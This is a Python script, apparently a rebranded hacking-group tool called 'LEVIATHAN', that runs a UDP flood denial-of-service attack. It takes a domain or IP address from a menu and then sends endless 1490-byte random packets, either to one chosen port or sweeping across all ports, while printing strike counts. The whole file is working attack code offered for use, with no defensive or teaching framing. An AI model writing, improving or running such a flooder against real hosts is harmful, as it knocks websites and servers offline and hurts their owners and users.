import os
import sys
import time
import socket
import random
from platform import system

# --- COLORS ---
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
B = '\033[1;34m'  # Blue
C = '\033[1;36m'  # Cyan
RE = '\033[0m'    # Reset

# Background Highlights
HG = '\033[1;42;30m' 
HB = '\033[1;44;37m' 
HC = '\033[1;46;30m' 

def clear():
    os.system('cls' if system() == "Windows" else 'clear')

def logo():
    clear()
    print(f"{C}")
    print(r"""
  ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
  ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
  ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
  ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
  ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
  ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ """)
    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"  {HG}  AUTHOR: LEVIATHAN  {RE}  {HB}  TEAM: LEVIATHAN  {RE}  {HC}  VER: 1.2  {RE}")
    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}")

# Socket Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Main Menu Logic (ACS Style)
while True:
    logo()
    print(f"\n {G}[01]{W} DOMAIN TARGET (Website)")
    print(f" {G}[02]{W} IP TARGET (Server/Address)")
    print(f" {G}[03]{W} ABOUT LEVIATHAN")
    print(f" {R}[00]{W} EXIT TOOL")
    
    opt = input(f"\n{C}┌──({G}Leviathan@Terminal{C})\n└─> {Y}")

    if opt == '1':
        domain = input(f"{B}[?]{W} Enter Domain: {Y}")
        try:
            ip = socket.gethostbyname(domain)
            break
        except:
            print(f"{R}Invalid Domain!{RE}")
            time.sleep(1)
    elif opt == '2':
        ip = input(f"{B}[?]{W} Enter IP Address: {Y}")
        break
    elif opt == '3':
        print(f"\n{HG} LEVIATHAN TOOLKIT {RE}")
        print(f"{W}Telegram: code_predator_amf (Original Author)")
        print(f"{W}Re-Branded: LEVIATHAN")
        input(f"\n{G}Press Enter to continue...")
    elif opt == '0' or opt == '00':
        sys.exit()
    else:
        print(f"{R}Invalid Choice!{RE}")
        time.sleep(1)

# Port Selection Logic (ACS Style Flow)
port_mode = False
port = 2

logo()
print(f"\n{W}TARGET IP: {G}{ip}")
port_bool = input(f"{C}Certain port? [y/n]: {Y}").lower()

if port_bool == "y":
    port_mode = True
    port = int(input(f"{B}[?]{W} Enter Port: {Y}"))
else:
    port_mode = False

# Initializing Animation
logo()
print(f'\n{HC} INITIALIZING LEVIATHAN SYSTEM.... {RE}')
time.sleep(1)
print(f'{G}CONNECTING TO CORE....')
time.sleep(2)
print(f'{Y}STARTING ATTACK FLOW....')
time.sleep(1)

sent = 0

# --- THE WORKING PART (Attack Flow) ---
if not port_mode:
    try:
        while True:
            if port >= 65534:
                port = 1
            elif port == 1900:
                port = 1901
            
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            # ACS স্টাইল স্ক্রলিং আউটপুট
            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
    except KeyboardInterrupt:
        print(f'\n{R}Stopped by User{RE}')
else:
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
    except KeyboardInterrupt:
        print(f'\n{R}Stopped by User{RE}')
